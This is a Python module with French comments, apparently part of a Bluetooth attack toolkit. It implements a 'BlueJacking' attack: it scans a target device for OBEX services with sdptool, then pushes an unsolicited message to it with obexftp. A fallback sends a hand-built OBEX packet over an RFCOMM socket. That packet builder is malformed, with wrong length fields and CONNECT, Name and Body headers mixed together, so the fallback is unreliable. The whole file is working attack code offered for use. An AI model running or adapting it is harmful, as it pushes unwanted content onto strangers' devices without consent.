#!/usr/bin/env python3
"""
Module d'attaque BlueJacking - Envoi de messages non sollicités
"""

import subprocess
import socket
import struct
import time
import os
from typing import Optional, Callable

class BlueJackingAttack:
    def __init__(self, config: dict, callback: Optional[Callable] = None):
        self.config = config
        self.callback = callback
        self.running = False
        
    def execute(self, target_address: str, message: str = None) -> bool:
        """Exécuter l'attaque BlueJacking"""
        try:
            self.running = True
            self._log("Démarrage de l'attaque BlueJacking...", "info")
            
            # Message par défaut si aucun fourni
            if not message:
                message = self.config.get('default_message', 'Hello from BlueJacking!')
                
            # Vérifier la vulnérabilité BlueJacking
            if not self._check_bluejacking_vulnerability(target_address):
                self._log("Cible non vulnérable au BlueJacking", "warning")
                return False
                
            # Envoyer le message via OBEX
            if self._send_obex_message(target_address, message):
                self._log("Message BlueJacking envoyé avec succès!", "success")
                return True
            else:
                self._log("Échec de l'envoi du message", "error")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de l'attaque BlueJacking: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_bluejacking_vulnerability(self, target_address: str) -> bool:
        """Vérifier si la cible est vulnérable au BlueJacking"""
        try:
            self._log("Vérification de la vulnérabilité BlueJacking...", "info")
            
            # Vérifier si l'appareil accepte les connexions OBEX
            cmd = ['sdptool', 'browse', target_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                output = result.stdout.lower()
                
                # Chercher les services OBEX
                if 'obex' in output or 'object push' in output:
                    self._log("Service OBEX détecté", "info")
                    return True
                else:
                    self._log("Aucun service OBEX détecté", "warning")
                    return False
            else:
                self._log("Impossible de parcourir les services", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de la vérification: {e}", "error")
            return False
            
    def _send_obex_message(self, target_address: str, message: str) -> bool:
        """Envoyer un message via OBEX"""
        try:
            self._log(f"Envoi du message: {message}", "info")
            
            # Créer un fichier temporaire avec le message
            temp_file = f"/tmp/bluejacking_msg_{int(time.time())}.txt"
            with open(temp_file, 'w') as f:
                f.write(message)
                
            try:
                # Utiliser obexftp pour envoyer le fichier
                cmd = [
                    'obexftp', 
                    '-b', target_address,
                    '-B', '9',  # Canal OBEX
                    '-p', temp_file
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                
                if result.returncode == 0:
                    self._log("Message envoyé via OBEX", "success")
                    return True
                else:
                    self._log(f"Échec OBEX: {result.stderr}", "warning")
                    
                    # Essayer avec une approche alternative
                    return self._send_alternative_message(target_address, message)
                    
            finally:
                # Nettoyer le fichier temporaire
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    
        except Exception as e:
            self._log(f"Erreur lors de l'envoi OBEX: {e}", "error")
            return False
            
    def _send_alternative_message(self, target_address: str, message: str) -> bool:
        """Méthode alternative d'envoi de message"""
        try:
            self._log("Tentative d'envoi alternatif...", "info")
            
            # Utiliser hcitool pour envoyer un paquet personnalisé
            # Créer un paquet OBEX personnalisé
            obex_packet = self._create_obex_packet(message)
            
            # Envoyer via socket Bluetooth
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
            sock.settimeout(10)
            
            # Se connecter au port RFCOMM 9 (OBEX)
            sock.connect((target_address, 9))
            
            # Envoyer le paquet OBEX
            sock.send(obex_packet)
            
            # Attendre une réponse
            response = sock.recv(1024)
            
            sock.close()
            
            if response:
                self._log("Message envoyé avec succès (méthode alternative)", "success")
                return True
            else:
                self._log("Aucune réponse reçue", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur méthode alternative: {e}", "error")
            return False
            
    def _create_obex_packet(self, message: str) -> bytes:
        """Créer un paquet OBEX pour le message"""
        # Header OBEX
        packet = b'\x80'  # CONNECT
        packet += struct.pack('>H', len(message) + 3)  # Length
        packet += b'\x10'  # Version
        packet += b'\x00'  # Flags
        packet += struct.pack('>H', 0x1000)  # Max packet size
        
        # Header pour le nom du fichier
        packet += b'\x01'  # Name header
        packet += struct.pack('>H', len(message) + 3)
        packet += b'msg.txt'
        
        # Données du message
        packet += b'\x49'  # Body header
        packet += struct.pack('>H', len(message))
        packet += message.encode('utf-8')
        
        return packet
        
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
